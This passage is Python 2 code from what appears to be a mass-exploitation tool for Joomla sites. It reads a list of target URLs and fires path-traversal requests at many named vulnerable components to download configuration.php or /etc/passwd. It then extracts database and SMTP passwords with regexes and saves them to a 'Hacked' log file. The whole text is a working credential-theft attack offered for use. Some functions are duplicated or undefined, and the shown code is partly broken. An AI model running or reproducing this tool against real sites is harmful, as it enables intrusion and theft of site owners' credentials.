                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_product_modul():
    req = requests.get(url + '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def wd_download():
    req = requests.get(url + '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def jat3action():
    req = requests.get(url + '/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def com_community():
    req = requests.get(url + '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def download_monitor():
    req = requests.get(url + '/index.php?option=com_download-monitor&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')

def download_monitor():
    req = requests.get(url + '/index.php?option=com_download-monitor&file=configuration.php', verify=False)
    page_content = req.text
    if req.status_code == 200 and ("$user" and "$host" and "$password") in page_content:
        print "\033[92m[✔️]\033[0m \033[1;41mFound!!!\033[0;m"
        print "[$] URL:",url
        confighost = "\$host = '(.*?)'"
        configuser = "\$user = '(.*?)'"
        configpass = "\$password = '(.*?)'"
        configdbname = "\$db = '(.*?)'"
        smtphost = "\$smtphost = '(.*?)'"
        smtpuser = "\$smtpuser = '(.*?)'"
        smtppass = "\$smtppass = '(.*?)'"
        smtpport = "\$smtpport = '(.*?)'"
        smtpsecure = "\$smtpsecure = '(.*?)'"
        # Config
        confighost = re.findall(confighost, page_content)[0]
        configuser = re.findall(configuser, page_content)[0]
        configpass = re.findall(configpass, page_content)[0]
        configdbname = re.findall(configdbname, page_content)[0]
        # SMTP
        smtphost = re.findall(smtphost, page_content)[0]
        smtpuser = re.findall(smtpuser, page_content)[0]
        smtppass = re.findall(smtppass, page_content)[0]
        smtpport = re.findall(smtpport, page_content)[0]
        smtpsecure = re.findall(smtpsecure, page_content)[0]
         
        print "--" * 20
        print " URL:",url
        print " HOST:",confighost
        print " USER:",configuser
        print " PASS:",configpass
        print " DATABASE:",configdbname
        # print " SMTP HOST:",smtphost
        # print " SMTP USER:",smtpuser
        # print " SMTP PASS:",smtppass
        # print " SMTP PORT:",smtpport
        # print " SMTP SECURITY:",smtpsecure
        print "--" * 20
        with open('Hacked/joomla_configs.txt', 'a') as joomla_configs:
            joomla_configs.write('================================\n')
            joomla_configs.write('Site: ' + url + '\n')
            joomla_configs.write('Host: ' + confighost + '\n')
            joomla_configs.write('User: ' + configuser + '\n')
            joomla_configs.write('Pass: ' + configpass + '\n')
            joomla_configs.write('DB: ' + configdbname + '\n')
            if len(smtpuser) > 0 and len(smtppass) > 0:
                joomla_configs.write('SMTPHost: ' + smtphost + '\n')
                joomla_configs.write('SMTPUser: ' + smtpuser + '\n')
                joomla_configs.write('SMTPPass: ' + smtppass + '\n')
                joomla_configs.write('SMTPSecure: ' + smtpsecure + '\n')
#Check Type Of website 
def detect():
    try:
        if requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_checker()
        elif requests.get(url + "/language/en-GB/en-GB.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/language/en-GB/en-GB.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[92m[!]\033[0m CMS: Joomla"
            joomla_checker()
        else:
            print "[X] SORRY NO Joomla FOUND "
    except:
        pass

def joomla_checker():

    print "\033[0;95mLet Me Check Your Website Type\033[0m"
    print "\033[10;95m                           \033[0m"

    print "[💣💣] COM_Hdflvplayer" 
    com_hdflvplayer() 
    print "[💣💣] COM_Contushdvideoshare" 
    com_contushdvideoshare()
    print "[💣💣] COM_Jetext" 
    com_jetext()
    print "[💣💣] COM_Product-modul" 
    com_product_modul() 
    print "[💣💣] COM_WDdownload" 
    wd_download()                
    print "[💣💣] COM_Jat3actiony" 
    jat3action()
    print "[💣💣] COM_Community" 
    com_community()
    print "[💣💣] COM_download_monitor" 
    download_monitor()
    print "[💣💣] COM_Cckjseblod " 
    com_cckjseblod() 
    print "[💣💣] COM_Joomanager" 
    com_joomanager()
    print "[💣💣] com_Aceftp" 
    com_aceftp()
    print "[💣💣] COM_Jtagmembersdirectory" 
    com_jtagmembersdirectory()
    print "[💣💣] COM_Macgallery" 
    com_macgallery()
    print "[💣💣] COM_Facegallery" 
    com_macgallery()
    print "[💣💣] COM_S5_media_player" 
    s5_media_player() 
    print "[💣💣] COM_Docman" 
    com_docman()
    print "[💣💣] MOD_Dvfoldercontent" 
    mod_dvfoldercontent()
    print "[💣💣] COM_Addproperty" 
    com_addproperty()
    print "=========================================="

    #Create And Save
def Logger():
    try:
        if not os.path.exists('Hacked'):
            os.mkdir('Hacked', 0755);
    except:
        pass

# Use For Call raw list Input
try:
    choose = raw_input("Choise # ")
    if choose == "Joom":
        requests.packages.urllib3.disable_warnings()
        file = raw_input("\033[92m[🦇🦇]\033[0m Enter Web List: ")
        with open(file, "r") as ins:
            array = []
            for line in ins:
                array.append(line)
                url = line.strip()
                Exploit()
 #For IP Exploit 
    elif choose == "Word":
       print'💀💀💀💀💀 Sorry We Not Yet Done 💀💀💀💀💀'

    else:
        
        print "💀💀💀💀💀 Worng Option Input Try Again 💀💀💀💀💀"
        exit()
        # choose = raw_input("# ")
except KeyboardInterrupt:
    print "\nThank For Using Me :>"  

#Main Function
def Main():
    try:
        Thread = ThreadPool(100) 
        results = Thread.map(req,joomla_checker, file)
        Thread.close() 
        Thread.join() 
    except:
        pass

if __name__ == '__main__':
    Main()	